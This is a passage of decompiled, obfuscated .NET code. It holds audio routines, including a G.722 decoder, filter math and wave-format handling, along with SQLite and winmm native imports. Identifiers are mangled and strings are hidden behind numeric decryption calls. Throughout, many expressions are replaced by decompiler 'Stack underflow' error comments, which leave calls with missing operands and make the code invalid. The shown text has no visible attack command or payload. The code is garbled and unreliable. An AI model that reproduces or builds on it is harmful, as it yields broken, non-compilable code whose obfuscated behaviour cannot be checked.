			_ = ((global::_0005._0008)/*Error near IL_0014: Stack underflow*/)._0001.WaveFormat;
			int num = ((global::_0005._0005)/*Error near IL_001b: Stack underflow*/)._0002;
			double num2 = /*Error near IL_001d: Stack underflow*// (double)num;
			long num3 = (long)((double)P_1 / num2);
			if (num3 % _0002._0001.WaveFormat.BlockAlign != 0L)
			{
				num3 -= num3 % _0002._0001.WaveFormat.BlockAlign;
			}
			return num3;
		}

		static byte[] _0001(_001A._0018 P_0)
		{
			//IL_0030: Incompatible stack heights: 0 vs 2
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr intPtr = ((_001A._0018)/*Error near IL_000c: Stack underflow*/)._0001;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0037: Stack underflow*/(intPtr, zero);
			if ((int)/*Error near IL_0015: Stack underflow*/ != 0)
			{
				return null;
			}
			return _0018._0001(_0018._0001(((_001A._0018)/*Error near IL_001e: Stack underflow*/)._0001), _0018._0001(P_0));
		}

		static IList<global::_0013._0010> _0001(global::_0016._0014 P_0)
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_000e: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0016._0014)/*Error near IL_000e: Stack underflow*/, (IList<global::_0013._0010>)null);
			return (IList<global::_0013._0010>)/*Error near IL_0006: Stack underflow*/;
		}

		static void _0001(_001E._0001 P_0)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0017: Expected I4, but got Unknown
			//IL_0019: Incompatible stack heights: 0 vs 1
			//IL_001c: Incompatible stack heights: 0 vs 2
			//IL_0023: Incompatible stack heights: 0 vs 1
			_ = ((global::_0016._0002<_0080._0002>)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = ((global::_0016._0002<_0080._0002>)/*Error near IL_000e: Stack underflow*/)._0001.Count;
			_003F val = /*Error near IL_0012: Stack underflow*/- 1;
			((List<_0080._0002>)/*Error near IL_0017: Stack underflow*/).RemoveAt((int)val);
		}

		static void _0001(global::_0004._0008 _0002, BinaryWriter P_1)
		{
			//IL_002c: Incompatible stack heights: 0 vs 2
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			_ = _009E_0002._007E_001B_0006;
			long num = ((global::_0004._0008)/*Error near IL_000e: Stack underflow*/)._0001;
			/*Error near IL_0036: Stack underflow*/((object)/*Error near IL_0036: Stack underflow*/, (int)num, SeekOrigin.Begin);
			_009F_0002._007E_001C_0006(P_1, _0018._0001(_0002._0001, _0002));
		}

		static _0014 _0001(CommandBehavior _0002, global::_0010._001C P_1)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_002d: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0010._001C)/*Error near IL_002a: Stack underflow*/);
			_0018._0001((global::_0010._001C)/*Error near IL_000b: Stack underflow*/);
			_0014 obj = new _0014(P_1, _0002);
			P_1._0001 = new WeakReference(obj, trackResurrection: false);
			return obj;
		}

		static string _0001(MmResult _0002, string _0003)
		{
			//IL_0020: Incompatible stack heights: 0 vs 2
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 2
			_ = _009D._0093_0004;
			_0080._0014._0001(107358058);
			_ = (object)(MmResult)/*Error near IL_0013: Stack underflow*/;
			return /*Error near IL_001a: Stack underflow*/((string)/*Error near IL_001a: Stack underflow*/, (object)/*Error near IL_001a: Stack underflow*/, (object)/*Error near IL_001a: Stack underflow*/);
		}

		static void _0001(DbType? _0002, string _0003, SQLiteConnectionFlags _0004)
		{
			//IL_000e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Invalid comparison between Unknown and I8
			//IL_0047: Incompatible stack heights: 0 vs 1
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			string.IsNullOrEmpty((string?)/*Error near IL_004e: Stack underflow*/);
			if ((int)/*Error near IL_0006: Stack underflow*/ == 0 && (long)(/*Error near IL_000f: Stack underflow*/ & 0x8000) == 32768)
			{
				Trace.WriteLine(_0018._0001((IFormatProvider)CultureInfo.CurrentCulture, _0080._0014._0001(107358069), new object[2] { _0002, _0003 }));
			}
		}

		static void _0001(_0019._0001 _0002, _0080._0002[] P_1)
		{
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			_ = ((_0019._0001)/*Error near IL_0039: Stack underflow*/).Generators;
			global::_0018._0005[] array = (global::_0018._0005[])/*Error near IL_003c: Stack underflow*/;
			foreach (global::_0018._0005 obj in array)
			{
				if (obj._0001 == GeneratorEnum.SampleID)
				{
					obj._0001 = P_1[obj._0001];
				}
			}
		}

		static global::_0007._0013 _0001(_0010 _0002)
		{
			//IL_000b: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			_0018._0001((_0010)/*Error near IL_0012: Stack underflow*/, (global::_0008._000E)null, out global::_0007._0013 _);
			return (global::_0007._0013)/*Error near IL_000a: Stack underflow*/;
		}

		static void _0001(_007F._0014 _0002, global::_0007._0014 P_1)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			Exception ex = null;
			try
			{
				_0018._0001((global::_0007._0014)/*Error near IL_000c: Stack underflow*/, (_007F._0014)/*Error near IL_000c: Stack underflow*/);
			}
			catch (Exception ex2)
			{
				ex = ex2;
			}
			finally
			{
				_0018._0001(P_1);
			}
			_0002._0001 = null;
			_0002._0001 = _001F._0014._0001;
			_0018._0001(_0002, ex);
		}

		static _001D._0016 _0001(float _0002, float _0003, float _0004)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0070: Incompatible stack heights: 0 vs 3
			//IL_0073: Incompatible stack heights: 0 vs 2
			//IL_007a: Expected F8, but got Unknown
			//IL_007a: Incompatible stack heights: 0 vs 2
			_ = global::_0015._009B_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0011: Stack underflow*/;
			_ = /*Error near IL_0012: Stack underflow*/* num;
			double num2 = (double)/*Error near IL_0015: Stack underflow*/;
			Math.Cos(/*Error near IL_0016: Stack underflow*/ / num2);
			double num3 = (double)/*Error near IL_001a: Stack underflow*/;
			double num4 = /*Error near IL_001f: Stack underflow*/((double)/*Error near IL_001f: Stack underflow*/) / (double)(2f * _0004);
			int num5 = 1;
			double num6 = -2.0 * num3;
			int num7 = 1;
			double num8 = 1.0 + num4;
			double num9 = -2.0 * num3;
			double num10 = 1.0 - num4;
			return new _001D._0016(num8, num9, num10, num5, num6, num7);
		}

		static void _0001(global::_0017._0082 P_0)
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 2
			//IL_0032: Incompatible stack heights: 0 vs 1
			if (((global::_0017._0082)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				_ = global::_0002._007E_0016;
				_0091._0080_0004(typeof(global::_0017._0082).TypeHandle);
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/);
				throw new ObjectDisposedException((string?)/*Error near IL_0021: Stack underflow*/);
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_column_double")]
		static extern double _0001(IntPtr _0002, int _0003);

		static void _0001(bool _0002, global::_0017._0082 P_1)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			if (!((global::_0017._0082)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				((global::_0017._0082)/*Error near IL_0011: Stack underflow*/)._0001 = true;
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _001D._0016 _0001(float _0002, float _0003, float _0004, float _0005)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_016b: Incompatible stack heights: 0 vs 3
			//IL_0171: Incompatible stack heights: 0 vs 2
			//IL_017b: Expected F8, but got Unknown
			//IL_017b: Incompatible stack heights: 0 vs 2
			_ = global::_0015._009B_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0014: Stack underflow*/;
			_ = /*Error near IL_0015: Stack underflow*/* num;
			double num2 = (double)/*Error near IL_001b: Stack underflow*/;
			Math.Cos(/*Error near IL_001c: Stack underflow*/ / num2);
			double num3 = (double)/*Error near IL_0023: Stack underflow*/;
			double num4 = /*Error near IL_0028: Stack underflow*/((double)/*Error near IL_0028: Stack underflow*/);
			double num5 = global::_0014._0095_0002(10.0, _0005 / 40f);
			double num6 = num4 / 2.0 * global::_0015._009F_0002((num5 + 1.0 / num5) * (double)(1f / _0004 - 1f) + 2.0);
			double num7 = 2.0 * global::_0015._009F_0002(num5) * num6;
			double num8 = num5 * (num5 + 1.0 - (num5 - 1.0) * num3 + num7);
			double num9 = 2.0 * num5 * (num5 - 1.0 - (num5 + 1.0) * num3);
			double num10 = num5 * (num5 + 1.0 - (num5 - 1.0) * num3 - num7);
			double num11 = num5 + 1.0 + (num5 - 1.0) * num3 + num7;
			double num12 = -2.0 * (num5 - 1.0 + (num5 + 1.0) * num3);
			double num13 = num5 + 1.0 + (num5 - 1.0) * num3 - num7;
			return new _001D._0016(num11, num12, num13, num8, num9, num10);
		}

		static void _0001(global::_0017._0080 _0002, byte[] P_1)
		{
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0017._0080)/*Error near IL_0038: Stack underflow*/);
			if (((global::_0017._0080)/*Error near IL_000b: Stack underflow*/)._0001 != 0)
			{
				throw new InvalidOperationException(_0080._0014._0001(107357972));
			}
			if (P_1 != null && P_1.Length == 0)
			{
				P_1 = null;
			}
			_0002._0001 = P_1;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0005._0005 _0001(int _0002, int _0003)
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Expected I4, but got Unknown
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 2
			_ = 8;
			return _0018._0001(_0005: /*Error near IL_0009: Stack underflow*/* _0003, _0002: (int)/*Error near IL_0010: Stack underflow*/, _0003: (int)/*Error near IL_0010: Stack underflow*/, _0004: (int)/*Error near IL_0010: Stack underflow*/, _0006: WaveFormatEncoding.MuLaw, _0007: _0002);
		}

		[DllImport("winmm.dll", EntryPoint = "midiOutOpen")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, global::_0018._0012._0004 _0004, IntPtr _0005, int _0006);

		static void _0001(double _0002, _001D._0016 _0003, double _0004, double _0005, double _0006, double _0007, double P_6)
		{
			//IL_0006: Unknown result type (might be due to invalid IL or missing references)
			//IL_000c: Expected F8, but got Unknown
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			_003F val = /*Error near IL_0007: Stack underflow*// /*Error near IL_0007: Stack underflow*/;
			((_001D._0016)/*Error near IL_000c: Stack underflow*/)._0001 = (double)val;
			_0003._0002 = P_6 / _0006;
			_0003._0003 = _0004 / _0006;
			_0003._0004 = _0005 / _0006;
			_0003._0005 = _0007 / _0006;
		}

		static bool _0001(global::_0001._0082 _0002, IntPtr _0003, bool _0004, bool _0005, string _0006)
		{
			//IL_003c: Incompatible stack heights: 0 vs 2
			//IL_0043: Incompatible stack heights: 0 vs 1
			//IL_0046: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_0043: Stack underflow*/((IntPtr)/*Error near IL_0043: Stack underflow*/, zero);
			if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
			{
				return false;
			}
			IntPtr intPtr = _0018._0001((global::_0001._0082)/*Error near IL_001a: Stack underflow*/, _0003);
			if (_0090_0002._009A_0005(intPtr, IntPtr.Zero))
			{
				return false;
			}
			return _0018._0001(_0002, intPtr, _0004, _0005, _0006);
		}

		static void _0001(global::_0013._0017 P_0)
		{
			//IL_0034: Incompatible stack heights: 0 vs 1
			//IL_0037: Incompatible stack heights: 0 vs 1
			if (((global::_0013._0017)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				int num = ((global::_0013._0017)/*Error near IL_0011: Stack underflow*/)._0001.Length;
				for (int i = 0; i < num; i++)
				{
					P_0._0001(i + 1, P_0._0001[i]);
				}
			}
		}

		static bool _0001(MixerControlType _0002)
		{
			//IL_0007: Invalid comparison between Unknown and I4
			//IL_0010: Invalid comparison between Unknown and I4
			//IL_0019: Invalid comparison between Unknown and I4
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0009: Stack underflow*/ <= 1879113728)
			{
				if ((int)/*Error near IL_0012: Stack underflow*/ == 1342373892 || (int)/*Error near IL_001b: Stack underflow*/ == 1879113728)
				{
					goto IL_0035;
				}
			}
			else if (_0002 == MixerControlType.Mux || _0002 == MixerControlType.MultipleSelect || _0002 == MixerControlType.Mixer)
			{
				goto IL_0035;
			}
			return false;
			IL_0035:
			return true;
		}

		static string _0001()
		{
			//IL_0044: Incompatible stack heights: 0 vs 2
			_ = _0091_0002._009C_0005;
			object obj = global::_0017._0084._0001;
			/*Error near IL_004b: Stack underflow*/((object)/*Error near IL_004b: Stack underflow*/);
			try
			{
				if (global::_0017._0084._0008 != null)
				{
					return global::_0017._0084._0008;
				}
				if (global::_0017._0084._0001)
				{
					return null;
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			return _0018._0001();
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("winmm.dll", EntryPoint = "waveOutOpen")]
		static extern MmResult _0001(out IntPtr _0002, IntPtr _0003, global::_0005._0005 _0004, global::_0017._0008._0003 _0005, IntPtr _0006, global::_0017._0008._0001 _0007);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static _0019._0015 _0001(global::_0016._0019 _0002, _001F._0015 _0003, global::_0003._0010 P_2)
		{
			//IL_0024: Incompatible stack heights: 0 vs 2
			//IL_0027: Incompatible stack heights: 0 vs 2
			//IL_002a: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((_001F._0015)/*Error near IL_000c: Stack underflow*/)._0001;
			global::_0017._001E obj;
			int num = ((global::_0006._0015)/*Error near IL_0017: Stack underflow*/)._0001((global::_0016._0019)/*Error near IL_0017: Stack underflow*/, (global::_0003._0010)/*Error near IL_0017: Stack underflow*/, out obj);
			/*Error near IL_001c: Stack underflow*/(num);
			return new _0019._0015(obj);
		}

		static double _0001(int _0002, int _0003)
		{
			//IL_0023: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_002c: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0053: Unknown result type (might be due to invalid IL or missing references)
			//IL_0079: Unknown result type (might be due to invalid IL or missing references)
			//IL_007b: Expected F8, but got Unknown
			//IL_007c: Incompatible stack heights: 0 vs 5
			//IL_007f: Incompatible stack heights: 0 vs 2
			//IL_0086: Expected F8, but got Unknown
			//IL_0086: Incompatible stack heights: 0 vs 1
			_ = 287.0 / 800.0;
			_ = 0.48829;
			_ = global::_0015._009A_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0023: Stack underflow*/;
			_ = /*Error near IL_0024: Stack underflow*/* num;
			_003F val = /*Error near IL_0028: Stack underflow*/- 1;
			_003F val2 = /*Error near IL_002a: Stack underflow*// (double)val;
			/*Error near IL_0086: Stack underflow*/((double)val2);
			_003F val3 = /*Error near IL_002d: Stack underflow*/* /*Error near IL_002d: Stack underflow*/;
			return /*Error near IL_002e: Stack underflow*/- val3 + 0.14128 * global::_0015._009A_0002(Math.PI * 4.0 * (double)_0003 / (double)(_0002 - 1)) - 0.01168 * global::_0015._009A_0002(Math.PI * 6.0 * (double)_0003 / (double)(_0002 - 1));
		}

		static bool _0001(string _0002, global::_0008._0001 P_1)
		{
			//IL_00b1: Incompatible stack heights: 0 vs 2
			//IL_00bb: Incompatible stack heights: 0 vs 1
			try
			{
				_ = global::_000E._007E_008A_0002;
				char[] obj = new char[1] { '>' };
				/*Error near IL_00bb: Stack underflow*/((object)/*Error near IL_00bb: Stack underflow*/, obj);
				string[] array = (string[])/*Error near IL_00c1: Stack underflow*/;
				string text = global::_0002._007E_0006(array[0]);
				if (global::_001C._0097_0003(text))
				{
					byte[] array2 = _0015_0005._009D_000E(text);
					_0018._0001(P_1, array2, _0084._000F_0004(global::_0002._007E_0006(_0080._0014._0001(107357351)), _0002, _0080._0014._0001(107396940), global::_001E._009D_0003(text)), false);
					return false;
				}
				_0018._0001(P_1, (byte[])null, global::_000F._008B_0002(_0080._0014._0001(107357362), _0002), false);
				return false;
			}
			catch
			{
				return false;
			}
		}

		static long _0001(DateTime _0002)
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			//IL_00cb: Incompatible stack heights: 0 vs 1
			_ = _0002.Year;
			int num = (int)/*Error near IL_00c1: Stack underflow*/;
			_ = _0002.Month;
			int num2 = (int)/*Error near IL_0014: Stack underflow*/;
			int day = _0002.Day;
			if (num2 <= 2)
			{
				num--;
				num2 += 12;
			}
			int num3 = num / 100;
			int num4 = 2 - num3 + num3 / 4;
			int num5 = 36525 * (num + 4716) / 100;
			int num6 = 306001 * (num2 + 1) / 10000;
			long num7 = (long)(((double)(num5 + num6 + day + num4) - 1524.5) * 86400000.0);
			return num7 + (_0002.Hour * 3600000 + _0002.Minute * 60000 + _0002.Second * 1000 + _0002.Millisecond);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0016._0015 _0001(global::_0017._0019 P_0)
		{
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b5: Incompatible stack heights: 0 vs 2
			//IL_00bb: Incompatible stack heights: 0 vs 3
			_ = ((global::_0017._0019)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = ((global::_0017._0019)/*Error near IL_0014: Stack underflow*/)._0001;
			_ = 0;
			IntPtr intPtr = (nint)((global::_0017._0019)/*Error near IL_001f: Stack underflow*/)._0001.LongLength;
			int num = ((_001C._0004)/*Error near IL_0026: Stack underflow*/).Read((byte[])/*Error near IL_0026: Stack underflow*/, (int)/*Error near IL_0026: Stack underflow*/, (int)(nint)intPtr);
			if (num == 0)
			{
				return null;
			}
			global::_0018._0015 obj = _0018._0001(num);
			obj._0001(out var intPtr2, out var _, out var _);
			_0088_0005._0017_000F(P_0._0001, 0, intPtr2, num);
			obj._0001();
			obj._0001(num);
			global::_0016._0015 obj2 = _0018._0001();
			obj2._0001(obj);
			obj2._0001(P_0._0001);
			long num4 = _0018._0001(num, P_0._0001.WaveFormat);
			obj2._0002(num4);
			P_0._0001 += num4;
			_0098._008A_0004(obj);
			return obj2;
		}

		static void _0001(int _0002, string _0003)
		{
			//IL_0033: Incompatible stack heights: 0 vs 2
			try
			{
				object obj = _0080._0014._0001;
				_ = _0091_0002._009C_0005;
				if (3u != 0)
				{
					/*Error near IL_003a: Stack underflow*/((object)/*Error near IL_003a: Stack underflow*/);
				}
				try
				{
					_0080._0014._0001.Add(_0002, _0003);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
			catch
			{
			}
		}

		static int _0001(global::_0001._0017 _0002, short[] _0003, _001D._0018 _0004, int _0005, byte[] P_4)
		{
			int result = 0;
			int num = 0;
			int num2 = 0;
			while (num2 < _0005)
			{
				int num3;
				if (_0002.Packed)
				{
					if (_0002.InBits < _0002.BitsPerSample)
					{
						_0002.InBuffer |= (uint)(P_4[num2++] << _0002.InBits);
						_0002.InBits += 8;
					}
					num3 = (int)_0002.InBuffer & ((1 << _0002.BitsPerSample) - 1);
					_0002.InBuffer >>= _0002.BitsPerSample;
					_0002.InBits -= _0002.BitsPerSample;
				}
				else
				{
					num3 = P_4[num2++];
				}
				int num5;
				int num4;
				int num6;
				switch (_0002.BitsPerSample)
				{
				default:
					num4 = num3 & 0x3F;
					num5 = (num3 >> 6) & 3;
					num6 = _001D._0018._000E[num4];
					num4 >>= 2;
					break;
				case 7:
					num4 = num3 & 0x1F;
					num5 = (num3 >> 5) & 3;
					num6 = _001D._0018._0008[num4];
					num4 >>= 1;
					break;
				case 6:
					num4 = num3 & 0xF;
					num5 = (num3 >> 4) & 3;
					num6 = _001D._0018._0007[num4];
					break;
				}
				num6 = _0002.Band[0]._0005 * num6 >> 15;
				int num7 = _0002.Band[0]._0001 + num6;
				if (num7 > 16383)
				{
					num7 = 16383;
				}
				else if (num7 < -16384)
				{
					num7 = -16384;
				}
				num6 = _001D._0018._0007[num4];
				int num8 = _0002.Band[0]._0005 * num6 >> 15;
				num6 = _001D._0018._0002[num4];
				num4 = _0002.Band[0]._0004 * 127 >> 7;
				num4 += _001D._0018._0001[num6];
				if (num4 < 0)
				{
					num4 = 0;
				}
				else if (num4 > 18432)
				{
					num4 = 18432;
				}
				_0002.Band[0]._0004 = num4;
				num4 = (_0002.Band[0]._0004 >> 6) & 0x1F;
				num6 = 8 - (_0002.Band[0]._0004 >> 11);
				int num9 = ((num6 < 0) ? (_001D._0018._0003[num4] << -num6) : (_001D._0018._0003[num4] >> num6));
				_0002.Band[0]._0005 = num9 << 2;
				_0018._0001(0, _0002, num8);
				if (!_0002.EncodeFrom8000Hz)
				{
					num6 = _001D._0018._0006[num5];
					int num10 = _0002.Band[1]._0005 * num6 >> 15;
					num = num10 + _0002.Band[1]._0001;
					if (num > 16383)
					{
						num = 16383;
					}
					else if (num < -16384)
					{
						num = -16384;
					}
					num6 = _001D._0018._0005[num5];
					num4 = _0002.Band[1]._0004 * 127 >> 7;
					num4 += _001D._0018._0004[num6];
					if (num4 < 0)
					{
						num4 = 0;
					}
					else if (num4 > 22528)
					{
						num4 = 22528;
					}
					_0002.Band[1]._0004 = num4;
					num4 = (_0002.Band[1]._0004 >> 6) & 0x1F;
					num6 = 10 - (_0002.Band[1]._0004 >> 11);
					num9 = ((num6 < 0) ? (_001D._0018._0003[num4] << -num6) : (_001D._0018._0003[num4] >> num6));
					_0002.Band[1]._0005 = num9 << 2;
					_0018._0001(1, _0002, num10);
				}
				if (_0002.ItuTestMode)
				{
					_0003[result++] = (short)(num7 << 1);
					_0003[result++] = (short)(num << 1);
					continue;
				}
				if (_0002.EncodeFrom8000Hz)
				{
					_0003[result++] = (short)(num7 << 1);
					continue;
				}
				for (int i = 0; i < 22; i++)
				{
					_0002.QmfSignalHistory[i] = _0002.QmfSignalHistory[i + 2];
				}
				_0002.QmfSignalHistory[22] = num7 + num;
				_0002.QmfSignalHistory[23] = num7 - num;
				int num11 = 0;
				int num12 = 0;
				for (int i = 0; i < 12; i++)
				{
					num12 += _0002.QmfSignalHistory[2 * i] * _001D._0018._000F[i];
					num11 += _0002.QmfSignalHistory[2 * i + 1] * _001D._0018._000F[11 - i];
				}
				_0003[result++] = (short)(num11 >> 11);
				_0003[result++] = (short)(num12 >> 11);
			}
			return result;
		}

		static IEnumerable<global::_0014._0002> _0001()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			_0018._0001(global::_0004._0003._0002);
			return (IEnumerable<global::_0014._0002>)/*Error near IL_0008: Stack underflow*/;
		}

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_malloc_size_interop")]
		static extern int _0001(IntPtr _0002);

		[DllImport("SQLite.Interop.dll", EntryPoint = "sqlite3_open_interop")]
		static extern _0080._0017 _0001(byte[] _0002, byte[] _0003, global::_0004._0015 _0004, int _0005, ref IntPtr _0006);

		static string _0001(global::_0002._0002 P_0)
		{
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0002._0002)/*Error near IL_002a: Stack underflow*/);
			byte[] array = default(byte[]);
			if (0 == 0)
			{
				array = (byte[])/*Error near IL_002d: Stack underflow*/;
			}
			if (array == null)
			{
				return null;
			}
			return _0084_0002._007E_008D_0005(global::_000E._0012._0001, array, 0, array.Length);
		}

		static void _0001(global::_0017._0019 P_0)
		{
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			if (((global::_0017._0019)/*Error near IL_0007: Stack underflow*/)._0002)
			{
				_0018._0001((global::_0017._0019)/*Error near IL_001f: Stack underflow*/);
				_0018._0001(P_0);
			}
		}

		static void _0001(double _0002, _001D._000E _0003, byte[] _0004, int _0005, double P_4)
		{
			//IL_00d2: Incompatible stack heights: 0 vs 1
			//IL_00d8: Incompatible stack heights: 0 vs 3
			//IL_00e2: Incompatible stack heights: 0 vs 1
			if (((_001D._000E)/*Error near IL_000a: Stack underflow*/)._0002 == 4)
			{
				_ = _0099_0002._0010_0006;
				_ = _0089_0005._0018_000F;
				float num = (float)/*Error near IL_001d: Stack underflow*/;
				/*Error near IL_00e2: Stack underflow*/(num);
				int num2 = _0003._0002;
				/*Error near IL_0030: Stack underflow*/((Array)/*Error near IL_0030: Stack underflow*/, 0, _0004, _0005, num2);
				if (_0003._0001 > 1)
				{
					_0099_0002._0010_0006(_0089_0005._0018_000F((float)P_4), 0, _0004, _0005 + _0003._0002, _0003._0002);
				}
			}
			else if (_0003._0002 == 2)
			{
				_0099_0002._0010_0006(_008A_0005._0019_000F((short)(_0002 * 32768.0)), 0, _0004, _0005, _0003._0002);
				if (_0003._0001 > 1)
				{
					_0099_0002._0010_0006(_008A_0005._0019_000F((short)(P_4 * 32768.0)), 0, _0004, _0005 + _0003._0002, _0003._0002);
				}
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_get_autocommit")]
		static extern int _0001(IntPtr _0002);

		static bool _0001(int _0002, global::_0017._007F._0007 _0003, int P_2)
		{
			//IL_00c7: Incompatible stack heights: 0 vs 1
			//IL_00cd: Incompatible stack heights: 0 vs 2
			//IL_00d3: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._007F._0007)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = ((global::_0017._007F._0007)/*Error near IL_0014: Stack underflow*/)._000E;
			short num = (short)/*Error near IL_001a: Stack underflow*/;
			((short[])/*Error near IL_001b: Stack underflow*/)[/*Error near IL_001b: Stack underflow*/] = num;
			_0003._0002[_0003._000E++] = (byte)(_0002 - 3);
			int num2 = _0018._0001(_0002 - 3, _0003);
			_0003._0001._0001[num2]++;
			if (num2 >= 265 && num2 < 285)
			{
				_0003._000F += (num2 - 261) / 4;
			}
			int num3 = _0018._0001(_0003, P_2 - 1);
			_0003._0002._0001[num3]++;
			if (num3 >= 4)
			{
				_0003._000F += num3 / 2 - 1;
			}
			return _0003._000E >= 16384;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static uint _0001(uint _0002)
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
